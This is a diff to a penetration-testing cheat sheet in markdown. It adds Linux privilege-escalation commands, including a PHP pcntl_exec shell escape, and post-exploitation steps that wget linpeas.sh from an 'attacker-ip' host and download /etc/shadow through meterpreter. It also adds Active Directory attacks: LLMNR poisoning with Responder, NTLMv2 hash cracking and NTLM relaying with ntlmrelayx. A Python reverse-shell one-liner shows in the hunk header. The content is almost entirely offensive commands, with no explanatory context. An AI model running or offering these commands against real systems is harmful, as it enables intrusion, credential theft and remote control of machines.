@@ -54,15 +54,27 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```bash
 $ sudo -l
 $ find / -perm -4000 -ls 2>/dev/null       # SUID
+$ find / -type f -perm -4000 2>/dev/null   # Alternative SUID find
 $ ./linpeas.sh                             # LinPEAS
+$ ./pspy64                                 # Process spy
+$ /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"  # PHP shell escape
 ```
 
 ## Post-Exploitation
 ```bash
 $ wget http://192.168.1.50:8000/linpeas.sh
 $ python3 -m http.server 8000
+$ wget http://attacker-ip/linpeas.sh linpeas.sh
 meterpreter> download /etc/shadow shadow
 meterpreter> upload shell.sh /tmp/
+```
+
+## Active Directory
+```bash
+$ sudo responder -I eth0 -dvPv             # LLMNR poisoning
+$ hashcat -m 5600 hashes.txt wordlist.txt  # Crack NTLMv2
+$ nmap --script=smb2-security-mode.nse -p445 10.0.0.10 -Pn  # SMB signing check
+$ sudo ntlmrelayx.py -tf targets.txt -smb2support  # NTLM relay
 ```
 
 ## Hash Cracking
